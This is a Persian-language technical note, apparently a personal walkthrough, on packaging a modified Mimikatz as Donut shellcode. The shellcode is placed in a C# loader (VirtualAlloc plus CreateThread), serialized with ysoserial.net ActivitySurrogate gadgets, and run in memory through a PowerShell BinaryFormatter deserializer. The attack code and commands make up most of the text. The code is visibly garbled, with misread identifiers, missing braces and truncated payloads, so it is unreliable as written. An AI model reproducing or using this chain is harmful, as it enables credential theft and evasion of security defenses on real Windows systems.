

من تو مرحله اول سورس مربوط به mimkatz رو یه تغییر کوچولو دادم بعدش compile کردم و پروژه کامپایل شده mimikatz رو از طریق پروژه donut با الگوریتم p2lab compress کردم و به shellcode در اوردم
بعدش اون shellcode رو داخل این loader اوردم و به مقدار shellcode که بود از سمت kernel به واسطه تابع virtualalloc حافظه گرفتم 
دقت کنید که این فقط یه کلاس هست که میاد برای shellcode execute میکنه همین 
این یه پروژه مستقل # C نیست که بتونه تنهایی اجرا شه 


```c#
using System;
using System.Runtime. InteropServices;

public class E

[D11Import("kerne132.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

[D11Import("kerne132.dll")]
public static extern IntPtr CreateThread(
IntPtr lpThreadAttributes,
uint dwStackSize,
IntPtr lpStartAddress,
IntPtr param,
uint dwCreationFlags,
ref uint lpThreadId

[D11Import("kerne132.dll")]
public static extern bool CloseHandle(IntPtr handle);

[D11Import("kerne132.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

public E()

byte[] my_buf = new byte [832383] {
0xe8,0x54,0x51,0x0c,0x00,0x54,0x51,0x0c,0x00,0x8d,0xf7,0xe5,0x25,0x4e,0xff,0xe7,0x88,0xcf,0xbc,0x97,0x50,0x85,0x6e,0x83,0x4d,0x4e,0x4e,0xb0,0xc4
for (int i= 0; i < my_buf.Length; i++)

my_buf[i] = 0x90; // NOP instruction

IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)my_buf.Length, 0x1000, 0x40);

if (funcAddr != IntPtr.Zero && my_buf.Length > 0)

Marshal.Copy(my_buf, 0, funcAddr, my_buf. Length);

uint threadId = 0;
IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);

if (hThread != IntPtr.Zero)

WaitForSingleObject(hThread, 0xFFFFFFFF);
CloseHandle(hThread) ;
```

تو مرحله بعدی من میخوام با استفاده از BinaryFormater بیام و این Loader رو به یه object serialaze شده در بیارم که میشه همون binaryformater 
برای اینکه بخوام اینکارو بکنم از یه پروژه یی میخوام استفاده کنم تحت عنوان 


در نهایت قرار هست که ما یه Dserialazer براش بنویسیم که بتونیم inmemry execute کنیم ysoserial که یکی از developer هاش هم آقای سروش دلیلی هست بیایم و این کلاس رو تبدیل به یه object serialaze شده بکنیم 

https://github.com/pwntester/ysoserial.net


![[Pasted image 20260710001544.png]]

گجتی که من میخوم ازش استفاده کنم ActivitySurrogateSelectorFromFile که از serialazer binaryformater استفاده میکنه و دلیل دیگر اینه که کلاسی که ما برای اجرای shellcode مون نوشتیم یه کلاسی هست که خودی خودش قابل compile نیست به همین خاطر از این گجت استفاده میکنیم برای ساخت object مون 

#### نکته : برای اینکه بیایم و از این گجت استفاده کنیم باید در قدم از از گجت ActivitySurrogateSelector بیایم و استفاده کنیم به این خاطر که رو گجت ActivitySurrogateSelectorFromFile یه protection هست که باید disable بشه 
پس ما تو مرحله اول با استفاده از گجت ActivitySurrogateSelector پروتکشن مربوط به گجت ActivitySurrogateSelectorFromFile رو بر میداریم و تو مرحله بعد از گجت ActivitySurrogateSelectorFromFile برای compile کد# C و ساخت object serialze شده استفاده میکنیم 


![[Pasted image 20260710002250.png]]


```
.\ysoserial.exe -g ActivitySurrogateDisableTypeCheck -f BinaryFormatter -c "ignored" > out1.txt
```


```
 ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ShellCodeLoader.cs;System.dll;System.Data.dll;System.Runtime.Extensions.dll;System.Runtime.InteropServices.dll" > out2.txt
```

این کامند نکته یی که داره اینه که چون ما داخل کلاس برنامه مون از کلاس هایی که باید استفاده نکردیم به این خاطر اینجا باید بگیم که بره از کلاس هایی که داخل برنامه مون استفاده کردیم رو import بکنه

حالا باید یه deserialazer براش بنویسیم که من با PowerShell براش نوشتم 

```powershell
[void] [Reflection . Assembly ] : : LoadWithPartialName( "System. Runtime. Serialization. Formatters . Binary')
$b = "AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0sIFZ1cnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZX1Ub2t1bj1iNz
$bBytes = [System.Text.Encoding] :: UTF8.GetBytes($b)

$bf = New-Object System. Runtime. Serialization. Formatters. Binary. BinaryFormatter
$stream = New-Object System. IO.MemoryStream
$stream.Write($bBytes, 0, $bBytes.Length)
$stream.Position = 0
Itry {
$result1 = $bf.Deserialize($stream)
Write-Host "success"
catch {
Write-Host "failed: $ "

$stream. Close()
$a = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV21uZG93cy5Gb3JtcywgVmVyc21vbj00LjAuMC4wLCBDdWx0dXJ1PW51dXRyYWwsIFB1Ymx
$aBytes = [System.Text.Encoding] :: UTF8.GetBytes($a)

$bf2 = New-Object System. Runtime. Serialization. Formatters . Binary.BinaryFormatter
$stream2 = New-Object System. IO.MemoryStream
$stream2.Write($aBytes, 0, $aBytes. Length)
$stream2.Position = 0
try {
$result2 = $bf2.Deserialize($stream2)
Write-Host "2 success"
catch {
Write-Host "2 failed: $"

$stream2.Close()
```

